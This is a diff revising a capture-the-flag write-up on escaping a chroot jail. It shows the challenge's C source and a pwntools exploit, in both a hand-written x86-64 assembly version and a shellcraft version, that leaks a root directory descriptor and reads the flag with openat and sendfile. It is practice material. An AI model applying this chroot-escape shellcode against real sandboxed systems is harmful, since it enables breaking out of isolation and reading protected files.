@@ -15,54 +15,51 @@
 == Challenge Source Code
 
 ```c
-#define _GNU_SOURCE 1
-
-#include <stdlib.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <time.h>
-#include <errno.h>
 #include <assert.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
-#include <sys/wait.h>
+#include <fcntl.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <sys/mman.h>
 #include <sys/sendfile.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
-int main(int argc, char **argv, char **envp)
-{
-    assert(argc > 0);
+int main(int argc, char **argv, char **envp) {
+  assert(argc > 0);
 
-    setvbuf(stdin, NULL, _IONBF, 0);
-    setvbuf(stdout, NULL, _IONBF, 1);
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stdout, NULL, _IONBF, 1);
 
-    assert(argc > 1);
+  assert(argc > 1);
 
-    // Checking to make sure you're not trying to open the flag.
-    assert(strstr(argv[1], "flag") == NULL);
+  // Checking to make sure you're not trying to open the flag.
+  assert(strstr(argv[1], "flag") == NULL);
 
-    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);
 
-    char jail_path[] = "/tmp/jail-XXXXXX";
-    assert(mkdtemp(jail_path) != NULL);
+  char jail_path[] = "/tmp/jail-XXXXXX";
+  assert(mkdtemp(jail_path) != NULL);
 
-    assert(chroot(jail_path) == 0);
+  assert(chroot(jail_path) == 0);
 
-    int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "try harder", 10);
-    close(fffd);
+  int fffd = open("/flag", O_WRONLY | O_CREAT);
+  write(fffd, "try harder", 10);
+  close(fffd);
 
-    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
-    assert(shellcode == (void *)0x1337000);
+  void *shellcode =
+      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
+           MAP_PRIVATE | MAP_ANON, 0, 0);
+  assert(shellcode == (void *)0x1337000);
 
-    int shellcode_size = read(0, shellcode, 0x1000);
+  int shellcode_size = read(0, shellcode, 0x1000);
 
-    ((void(*)())shellcode)();
+  ((void (*)())shellcode)();
 }
 ```
 
@@ -76,56 +73,39 @@ int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
 assert(chroot(jail_path) == 0);
 ```
 
-By passing `/` as the argument, we can cause the program to hold a file descriptor (likely FD 3) that points to the real root directory of the host system.
+By passing `/` as the argument, we can cause the program to hold a file descriptor (usually FD 3) that points to the real root directory of the host system.
 
 == Exploitation Plan
 
-1. *Leak the Root FD:* Run the challenge binary with `/` as the first argument. This will open the root directory and assign it to a file descriptor.
-2. *Bypass Chroot:* Since we have a handle to the real root directory, we can use the `openat` syscall. `openat` works like `open`, but it takes a directory file descriptor as a starting point.
-3. *Read the Flag:* We will use `openat(3, "flag", ...)` to open the real flag file relative to the leaked root FD.
-4. *Output:* Finally, we read the content of the flag and write it to stdout (FD 1).
+1. *Leak the Root FD:* Run the challenge binary with `/` as the first argument. This opens the host's root directory and assigns it to a file descriptor.
+2. *Bypass Chroot:* Since we have a handle to the real root directory, we can use the `openat` syscall. `openat` allows opening files relative to a directory file descriptor.
+3. *Read the Flag:* We will use `openat(3, "flag", ...)` to open the real flag file relative to the leaked root FD (FD 3).
+4. *Output:* Finally, we read the content of the flag and write it to stdout using `sendfile`.
 
 == Exploit Script
+
+The following Python script uses `pwntools` to automate the exploit. We leverage `shellcraft` to generate the shellcode for the `openat` and `sendfile` syscalls.
 
 ```python
 from pwn import *
 
-# Set up the target
 exe = "./challenge"
 context.binary = exe
 
-# Start the process with '/' as the argument to leak the root FD
+# Pass '/' to leak the root FD (fd 3)
 p = process([exe, "/"])
 
-# Assembly shellcode to read the flag using the leaked FD (3)
-shellcode = asm("""
-    /* openat(3, "flag", O_RDONLY) */
-    mov rdi, 3              /* dirfd: 3 (the leaked root FD) */
-    lea rsi, [rip + flag]   /* pathname: "flag" */
-    xor rdx, rdx            /* flags: O_RDONLY */
-    mov rax, 257            /* syscall: SYS_openat */
-    syscall
+# Shellcraft exploit
+# Since we are chrooted, we use openat with the leaked FD (3) to access the real flag.
+# No seccomp, so we can use any syscall and exit normally.
 
-    /* sendfile(1, fd, 0, 100) */
-    mov rsi, rax            /* in_fd: result from openat */
-    mov rdi, 1              /* out_fd: stdout */
-    xor rdx, rdx            /* offset: 0 */
-    mov r10, 100            /* count: 100 */
-    mov rax, 40             /* syscall: SYS_sendfile */
-    syscall
+sc = shellcraft.openat(3, "flag", constants.O_RDONLY)
+sc += shellcraft.sendfile(1, 'rax', 0, 100)
+sc += shellcraft.exit(0)
 
-    /* exit(0) */
-    mov rax, 60
-    xor rdi, rdi
-    syscall
+shellcode = asm(sc)
 
-flag:
-    .string "flag"
-""")
-
-# Send the shellcode
 p.send(shellcode)
-
-# Receive the flag
-p.interactive()
+print(p.recvall(timeout=1).decode())
+p.close()
 ```
